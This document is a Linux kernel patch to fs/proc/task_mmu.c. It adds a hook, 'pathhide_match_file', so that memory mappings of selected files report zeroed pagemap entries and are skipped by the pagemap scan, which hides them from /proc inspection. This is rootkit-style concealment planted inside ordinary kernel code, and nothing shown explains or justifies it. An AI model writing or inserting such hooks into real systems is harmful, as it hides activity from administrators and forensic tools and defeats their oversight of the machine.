@@ -1,0 +1,32 @@
+--- a/fs/proc/task_mmu.c
++++ b/fs/proc/task_mmu.c
+@@ -2157,6 +2157,18 @@
+ 	spinlock_t *ptl;
+ 	pte_t *pte, *orig_pte;
+ 	int err = 0;
++	extern bool pathhide_match_file(struct file *file);
++
++	if (vma->vm_file && pathhide_match_file(vma->vm_file)) {
++		pagemap_entry_t pme = make_pme(0, 0);
++
++		for (; addr < end; addr += PAGE_SIZE) {
++			err = add_to_pagemap(&pme, pm);
++			if (err)
++				return err;
++		}
++		return 0;
++	}
+ #ifdef CONFIG_TRANSPARENT_HUGEPAGE
+ 
+ 	ptl = pmd_trans_huge_lock(pmdp, vma);
+@@ -2756,6 +2768,10 @@
+ 	unsigned long vma_category = 0;
+ 	bool wp_allowed = userfaultfd_wp_async(vma) &&
+ 	    userfaultfd_wp_use_markers(vma);
++	extern bool pathhide_match_file(struct file *file);
++
++	if (vma->vm_file && pathhide_match_file(vma->vm_file))
++		return 1;
+ 
+ 	if (!wp_allowed) {
+ 		/* User requested explicit failure over wp-async capability */
